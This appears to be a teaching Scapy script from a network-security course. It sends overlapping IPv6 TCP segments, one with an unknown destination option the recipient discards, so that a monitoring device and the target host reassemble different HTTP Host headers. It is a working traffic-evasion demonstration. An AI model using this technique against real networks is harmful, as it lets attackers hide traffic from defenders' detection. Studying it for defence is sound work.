#!/usr/bin/env python



#
#   in this example, we are using a destination header to force the
# recipient to discard the segment, and then we follow it up with
# a second segment that uses the same sequence numbers completes the
# stream.
#
#   see 3wayIPv6.py for a "normal" http request.
#
# questions/comments: jullrich@sans.edu
#
##

from scapy.all import *
dst="2001:db8::1"
dport=80

ip=IPv6(dst=dst)
sport=random.randint(49152,65535)
isn=random.randint(0,4294967296)

# normal 3-way handshake 


TCP_SYN=TCP(sport=sport, dport=dport, flags="S", seq=isn,options=[('MSS',1440)])
TCP_SYNACK=sr1(ip/TCP_SYN)
my_ack = TCP_SYNACK.seq + 1
TCP_ACK=TCP(sport=sport, dport=dport, flags="A", seq=isn+1, ack=my_ack)
send(ip/TCP_ACK)
my_payload1="GET / HTTP/1.1\r\nHost: www."
my_payload2="sec546.com\r\n\r\n"
my_payload3="secbad.com\r\n\r\n"
TCP_PUSH=TCP(sport=sport,dport=dport, flags="PA", seq=isn+1,ack=my_ack)
send(ip/TCP_PUSH/my_payload1)
TCP_PUSH=TCP(sport=sport,dport=dport, flags="PA", seq=isn+1+len(my_payload1),ack=my_ack)
DH=IPv6ExtHdrDestOpt(options=HBHOptUnknown(otype=255,optdata='x'))
send(ip/DH/TCP_PUSH/my_payload2)
send(ip/TCP_PUSH/my_payload3)

TCP_FIN=TCP(sport=sport,dport=dport,flags="FA", seq=isn+1+len(my_payload1)+len(my_payload2),ack=my_ack)
send(ip/TCP_FIN)
